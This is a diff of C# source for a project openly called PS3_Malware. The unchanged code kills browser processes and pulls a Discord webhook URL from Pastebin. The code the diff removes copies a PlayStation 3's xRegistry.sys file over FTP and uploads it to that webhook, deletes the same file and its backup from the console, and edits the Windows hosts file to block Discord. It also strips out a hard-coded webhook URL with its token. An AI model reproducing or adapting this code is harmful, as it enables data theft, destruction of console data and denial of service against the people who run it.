@@ -45,8 +45,7 @@ namespace PS3_Malware
     {
         #region "Variables webhook"
 
-        public static string webhook_link = "https://discord.com/api/webhooks/1046213703462310051/0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD";
-        //public static string webhook_link = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens
+        public static string webhook_link = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter");
 
         #endregion
     }
@@ -131,7 +130,7 @@ namespace PS3_Malware
         #region Kill Processes
         static void KillProcesses()
         {
-            string[] processlist = { "discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic" };
+            string[] processlist = { "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic" };
             foreach (Process process in Process.GetProcesses())
             {
                 foreach (var name in processlist)
@@ -615,205 +614,6 @@ namespace PS3_Malware
             catch (Exception ex)
             {
 
-            }
-        }
-
-        #endregion
-    }
-
-    internal class MisakiV3 //xRegistry PS3 Grabber
-    {
-        #region "Variables"
-
-        static string ps3IP;
-
-        #endregion
-        #region "WebHook Functions"
-
-        class Webhook
-        {
-            private HttpClient Client;
-            private string Url;
-
-            public string Name { get; set; }
-            public string ProfilePictureUrl { get; set; }
-
-            public Webhook(string webhookUrl)
-            {
-                Client = new HttpClient();
-                Url = webhookUrl;
-            }
-
-            public bool SendMessage(string content, string file = null)
-            {
-                MultipartFormDataContent data = new MultipartFormDataContent();
-                data.Add(new StringContent(Name), "username");
-                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
-                data.Add(new StringContent(content), "content");
-
-                if (file != null)
-                {
-                    if (!File.Exists(file))
-                        throw new FileNotFoundException();
-
-                    byte[] bytes = File.ReadAllBytes(file);
-
-                    data.Add(new ByteArrayContent(bytes), "file", "img.jpeg");
-                }
-
-                var resp = Client.PostAsync(Url, data).Result;
-
-                return resp.StatusCode == HttpStatusCode.NoContent;
-            }
-
-            public bool SendMessageImage(string content, string file = null)
-            {
-                MultipartFormDataContent data = new MultipartFormDataContent();
-                data.Add(new StringContent(Name), "username");
-                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
-                data.Add(new StringContent(content), "content");
-
-                if (file != null)
-                {
-                    if (!File.Exists(file))
-                        throw new FileNotFoundException();
-
-                    byte[] bytes = File.ReadAllBytes(file);
-
-                    data.Add(new ByteArrayContent(bytes), "file", "file.png");
-                }
-
-                var resp = Client.PostAsync(Url, data).Result;
-
-                return resp.StatusCode == HttpStatusCode.NoContent;
-            }
-
-            public bool SendMessageFile(string content, string format, string file = null)
-            {
-                MultipartFormDataContent data = new MultipartFormDataContent();
-                data.Add(new StringContent(Name), "username");
-                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
-                data.Add(new StringContent(content), "content");
-
-                if (file != null)
-                {
-                    if (!File.Exists(file))
-                        throw new FileNotFoundException();
-
-                    byte[] bytes = File.ReadAllBytes(file);
-
-                    data.Add(new ByteArrayContent(bytes), "file", format);
-                }
-
-                var resp = Client.PostAsync(Url, data).Result;
-
-                return resp.StatusCode == HttpStatusCode.NoContent;
-            }
-        }
-
-        public static void SendWebHookMessage(string token, string name, string picture, string message, string file)
-        {
-            Webhook hook = new Webhook(token);
-            hook.Name = name;
-            hook.ProfilePictureUrl = picture;
-
-            hook.SendMessage(message, file);
-        }
-
-        public static void SendWebHookFile(string token, string name, string picture, string message, string format, string file)
-        {
-            Webhook hook = new Webhook(token);
-            hook.Name = name;
-            hook.ProfilePictureUrl = picture;
-
-            hook.SendMessageFile(message, format, file);
-        }
-
-
-        #endregion
-        #region "FTP Functions"
-
-        public static void FTP_DOWNLOAD(string URL, string username, string password, string pathConsole, string filePC)
-        {
-            using (var client = new WebClient())
-            {
-                client.Credentials = new NetworkCredential(username, password);
-                client.DownloadFile(URL + pathConsole, filePC);
-            }
-        }
-
-        #endregion
-        #region "Start"
-        public static void Start()
-        {
-            string xRegistry = Path.GetTempPath() + "xRegistry.sys";
-            FTP_DOWNLOAD("ftp://" + ps3IP, "", "", "/dev_flash2/etc/xRegistry.sys", xRegistry);
-            SendWebHookFile(Vars.webhook_link, "misaki", "", "xRegistry.sys file found!", "xRegistry.sys", xRegistry);
-        }
-
-        #endregion
-    }
-
-    internal class MisakiV4 //Delete all user on the PS3
-    {
-        #region "Variables"
-
-        static string ps3IP;
-
-        #endregion
-        #region "FTP Functions"
-        static bool FTP_DELETE(string uriString, bool ssl = false, bool binary = false, string ftpUsername = "def", string ftpPassword = "default")
-        {
-            var serverUri = new Uri(uriString);
-            try
-            {
-
-                if (serverUri.Scheme != Uri.UriSchemeFtp)
-                {
-                    return false;
-                }
-                // Get the object used to communicate with the server.
-                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(serverUri);
-                request.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
-                request.Method = WebRequestMethods.Ftp.DeleteFile;
-                request.UseBinary = binary;
-                request.AuthenticationLevel = System.Net.Security.AuthenticationLevel.MutualAuthRequired;
-
-                request.EnableSsl = ssl;
-                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
-                Console.WriteLine("[!¡] DEL: {0}", response.StatusDescription);
-                response.Close();
-                return true;
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[!*] ERR: {ex.GetType()} : {ex.Message} ||| {ex.StackTrace}");
-                return false;
-            }
-        }
-
-        #endregion
-        #region "Start"
-        public static void Start()
-        {
-            FTP_DELETE("ftp://" + ps3IP + "/dev_flash2/etc/backup/xRegistry.sys", false, false);
-            FTP_DELETE("ftp://" + ps3IP + "/dev_flash2/etc/xRegistry.sys", false, false);
-        }
-
-        #endregion
-    }
-
-    internal class MisakiV5 //Remove Discord Access (website + app)
-    {
-        #region "Start"
-        public static void Start()
-        {
-            using (StreamWriter w = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
-            {
-                w.WriteLine("\n\n0.0.0.0 discord.com");
-                w.WriteLine("\n0.0.0.0 support.discord.com");
-                w.WriteLine("\n0.0.0.0 canary.discord.com");
-                w.WriteLine("\n0.0.0.0 ptb.discord.com");
             }
         }
 
